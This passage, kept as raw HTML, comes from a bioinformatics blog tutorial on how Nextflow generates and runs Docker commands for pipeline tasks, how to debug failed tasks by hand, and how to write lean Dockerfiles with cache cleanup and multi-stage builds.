class="token plain"> work/fe/949a78b06c5fd8284aeb2f87d14f7d/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. View the command that was executed</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .command.run</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-nextflow-docker-command-for-vep-variant-effect-predictor">Example: Nextflow Docker Command for VEP (Variant Effect Predictor)<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#example-nextflow-docker-command-for-vep-variant-effect-predictor" class="hash-link" aria-label="Direct link to Example: Nextflow Docker Command for VEP (Variant Effect Predictor)" title="Direct link to Example: Nextflow Docker Command for VEP (Variant Effect Predictor)" translate="no">​</a></h4>
<p>Here's a complete example of how Nextflow runs a Docker container:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$NXF_BOXID</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&gt;</span><span class="token plain">/dev/null </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> stop </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$NXF_BOXID</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  --cpu-shares </span><span class="token number" style="color:hsl(35, 99%, 36%)">8192</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--memory</span><span class="token plain"> 14336m </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"NXF_TASK_WORKDIR"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"NXF_DEBUG=</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${NXF_DEBUG</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">:=</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">0}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your project working directory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your project working directory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-w</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$NXF_TASK_WORKDIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">id</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">id</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-g</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--name</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$NXF_BOXID</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  community.wave.seqera.io/library/ensembl-vep:115.2--90ec797ecb088e9a </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  /bin/bash </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your project working directory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">/work/fe/949a78b06c5fd8284aeb2f87d14f7d/.command.run nxf_trace</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="breaking-down-the-docker-command">Breaking Down the Docker Command<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#breaking-down-the-docker-command" class="hash-link" aria-label="Direct link to Breaking Down the Docker Command" title="Direct link to Breaking Down the Docker Command" translate="no">​</a></h4>
<p>Let's understand each component:</p>
<table><thead><tr><th>Component</th><th>Purpose</th></tr></thead><tbody><tr><td><code>docker run</code></td><td>Start a new container</td></tr><tr><td><code>-i</code></td><td>Keep STDIN open (interactive)</td></tr><tr><td><code>--cpu-shares 8192</code></td><td>Allocate CPU resources (set by Nextflow from cpus directive)</td></tr><tr><td><code>--memory 14336m</code></td><td>Limit memory to 14GB (set by Nextflow from memory directive)</td></tr><tr><td><code>-e NXF_TASK_WORKDIR</code></td><td>Pass Nextflow task work directory env var</td></tr><tr><td><code>-e NXF_DEBUG=${NXF_DEBUG:=0}</code></td><td>Pass debug flag</td></tr><tr><td><code>-v /project:/project</code></td><td>Mount project directory for input/output</td></tr><tr><td><code>-w "$NXF_TASK_WORKDIR"</code></td><td>Set working directory inside container</td></tr><tr><td><code>-u $(id -u):$(id -g)</code></td><td>Run as current user (file permissions)</td></tr><tr><td><code>--name $NXF_BOXID</code></td><td>Name the container (cleanup reference)</td></tr><tr><td><code>image:tag</code></td><td>Container image to use</td></tr><tr><td><code>/bin/bash .command.run</code></td><td>Execute the task script</td></tr><tr><td><code>nxf_trace</code></td><td>Nextflow tracing flag</td></tr></tbody></table>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="re-running-a-failed-task-manually">Re-Running a Failed Task Manually<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#re-running-a-failed-task-manually" class="hash-link" aria-label="Direct link to Re-Running a Failed Task Manually" title="Direct link to Re-Running a Failed Task Manually" translate="no">​</a></h4>
<p>If a task fails in Nextflow, you can manually re-run it for debugging:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Navigate to the task work directory</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> work/fe/949a78b06c5fd8284aeb2f87d14f7d/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. View the task script</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .command.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. View Nextflow's Docker wrapper</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .command.run</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 4. Manually run the Docker command (copy from .command.run output)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># and inspect what went wrong</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  --cpu-shares </span><span class="token number" style="color:hsl(35, 99%, 36%)">8192</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--memory</span><span class="token plain"> 14336m </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"NXF_TASK_WORKDIR"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your project working directory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your project working directory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-w</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$NXF_TASK_WORKDIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">id</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">id</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-g</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  community.wave.seqera.io/library/ensembl-vep:115.2--90ec797ecb088e9a </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  /bin/bash </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your project working directory</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">/work/fe/949a78b06c5fd8284aeb2f87d14f7d/.command.run</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 5. Check the exit code</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .exitcode</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 6. View any error logs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .command.err  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># (if exists)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> .command.out  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># (if exists)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 7. If you run on HPC, (e.g SLURM ), run submit job</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sbatch .command.run</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 8. You can debug manually by running container interactively</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-w</span><span class="token plain"> </span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">your container</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 9. Modify .command.sh then inside your container, start to debug by running command directly</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> .command.sh</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-nextflow-docker-features">Key Nextflow Docker Features<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#key-nextflow-docker-features" class="hash-link" aria-label="Direct link to Key Nextflow Docker Features" title="Direct link to Key Nextflow Docker Features" translate="no">​</a></h4>
<table><thead><tr><th>Feature</th><th>How Nextflow Uses It</th></tr></thead><tbody><tr><td><strong>Resource limits</strong></td><td><code>--cpus</code> and <code>--memory</code> directives → <code>--cpu-shares</code> and <code>--memory</code> flags</td></tr><tr><td><strong>Volume mounts</strong></td><td>Pipeline inputs/outputs → <code>-v</code> flags</td></tr><tr><td><strong>User permissions</strong></td><td>Current user → <code>-u $(id -u):$(id -g)</code></td></tr><tr><td><strong>Work directory</strong></td><td>Task-specific directory → <code>-w "$NXF_TASK_WORKDIR"</code></td></tr><tr><td><strong>Container cleanup</strong></td><td>Automatic removal → <code>docker rm</code> commands</td></tr><tr><td><strong>Environment variables</strong></td><td>Pipeline configuration → <code>-e</code> flags</td></tr></tbody></table>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="profiling-and-optimization">Profiling and Optimization<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#profiling-and-optimization" class="hash-link" aria-label="Direct link to Profiling and Optimization" title="Direct link to Profiling and Optimization" translate="no">​</a></h4>
<p>By examining the actual Docker commands, you can:</p>
<ol>
<li class="">
<p><strong>Check resource allocation:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"cpu-shares\|memory"</span><span class="token plain"> work/*/*</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">/.command.run</span><br></span></code></pre></div></div>
</li>
<li class="">
<p><strong>Verify mounted volumes:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"\-v"</span><span class="token plain"> work/ab/abc123*/.command.run</span><br></span></code></pre></div></div>
</li>
<li class="">
<p><strong>See container images being used:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"docker run"</span><span class="token plain"> work/*/*</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">/.command.run </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-oE</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"image:[^ ]+"</span><br></span></code></pre></div></div>
</li>
<li class="">
<p><strong>Profile task execution:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check how long each task took</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">dir</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> work/*/*/*/.command.trace</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Task: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">dirname</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> $dir</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$dir</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><br></span></code></pre></div></div>
</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="summary">Summary<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary" translate="no">​</a></h3>
<ul>
<li class="">Nextflow automatically generates Docker commands for each task</li>
<li class="">Task commands are stored in <code>work/&lt;task-id&gt;/.command.run</code></li>
<li class="">You can inspect and manually re-run failed tasks</li>
<li class="">Understanding these commands helps with debugging and optimization</li>
<li class="">Resource limits from Nextflow directives are converted to Docker flags</li>
<li class="">Each task runs in isolation with its own work directory</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-efficient-docker-container-building-for-bioinformatics">3. Efficient Docker Container Building for Bioinformatics<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#3-efficient-docker-container-building-for-bioinformatics" class="hash-link" aria-label="Direct link to 3. Efficient Docker Container Building for Bioinformatics" title="Direct link to 3. Efficient Docker Container Building for Bioinformatics" translate="no">​</a></h2>
<p>Building efficient Docker containers keeps your images fast to download, runs, and easy to share.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="best-practices">Best Practices<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#best-practices" class="hash-link" aria-label="Direct link to Best Practices" title="Direct link to Best Practices" translate="no">​</a></h3>
<ul>
<li class="">
<p><strong>Start with a lightweight, official base image</strong></p>
<ul>
<li class="">Alpine, Debian-slim, Ubuntu LTS</li>
</ul>
</li>
<li class="">
<p><strong>Install only required tools</strong></p>
<ul>
<li class="">Don't add extra utilities or unnecessary packages</li>
</ul>
</li>
<li class="">
<p><strong>Clean cache and remove temp files</strong></p>
<ul>
<li class="">In the same RUN step: <code>rm -rf /var/lib/apt/lists/*</code></li>
</ul>
</li>
<li class="">
<p><strong>Use multi-stage builds for large or compiled tools</strong></p>
<ul>
<li class="">Build from source in a builder stage, copy binaries into a slim final image</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="minimal-example-install-a-tool">Minimal Example: Install a Tool<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#minimal-example-install-a-tool" class="hash-link" aria-label="Direct link to Minimal Example: Install a Tool" title="Direct link to Minimal Example: Install a Tool" translate="no">​</a></h3>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">FROM</span><span class="token instruction"> ubuntu:24.04</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> apt-get update &amp;&amp; </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    apt-get install -y --no-install-recommends samtools &amp;&amp; </span><span class="token instruction operator" style="color:hsl(221, 87%, 60%)">\</span><span class="token instruction"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token instruction">    apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/*</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">WORKDIR</span><span class="token instruction"> /data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">CMD</span><span class="token instruction"> [</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"/bin/bash"</span><span class="token instruction">]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="multi-stage-build-example-build-from-source">Multi-Stage Build Example: Build from Source<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#multi-stage-build-example-build-from-source" class="hash-link" aria-label="Direct link to Multi-Stage Build Example: Build from Source" title="Direct link to Multi-Stage Build Example: Build from Source" translate="no">​</a></h3>
